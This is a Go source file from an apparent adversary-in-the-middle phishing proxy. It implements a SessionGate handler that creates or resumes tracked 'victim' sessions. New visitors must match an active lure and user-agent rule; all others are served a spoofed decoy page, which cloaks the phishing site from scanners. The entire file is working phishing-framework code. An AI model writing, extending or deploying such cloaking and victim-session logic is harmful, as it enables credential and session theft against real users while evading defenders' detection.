package request

import (
	"fmt"
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

type sessionManager interface {
	Get(id string) (*aitm.Session, error)
	NewSession(ctx *aitm.ProxyContext) (*aitm.Session, error)
}

// SessionGate combines session resolution with lure validation into a single
// pipeline step. For requests with an existing session cookie the session is
// loaded and all lure checks are skipped — the victim already passed validation
// on their initial lure hit. For new visitors (no cookie), lure rules are
// enforced before a session is created, so no orphaned sessions accumulate for
// spoofed requests.
type SessionGate struct {
	Sessions sessionManager
	Spoof    spoofer
}

func (h *SessionGate) Name() string { return "SessionGate" }

func (h *SessionGate) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	// Established session — load and skip lure checks.
	if cookie, err := req.Cookie(proxy.SessionCookieName); err == nil && cookie.Value != "" {
		if sess, err := h.Sessions.Get(cookie.Value); err == nil {
			ctx.Session = sess
			ctx.IsNewSession = false
			return nil
		}
	}

	// New visitor — enforce lure rules before creating a session.
	if ctx.Lure == nil || ctx.Lure.IsPaused() || !ctx.Lure.MatchesUA(req.UserAgent()) {
		h.Spoof.ServeWithTarget(ctx.ResponseWriter, req, contextSpoofURL(ctx))
		return proxy.ErrShortCircuit
	}

	sess, err := h.Sessions.NewSession(ctx)
	if err != nil {
		return fmt.Errorf("session_gate: %w", err)
	}

	ctx.Session = sess
	ctx.IsNewSession = true

	return nil
}

var _ proxy.RequestHandler = (*SessionGate)(nil)
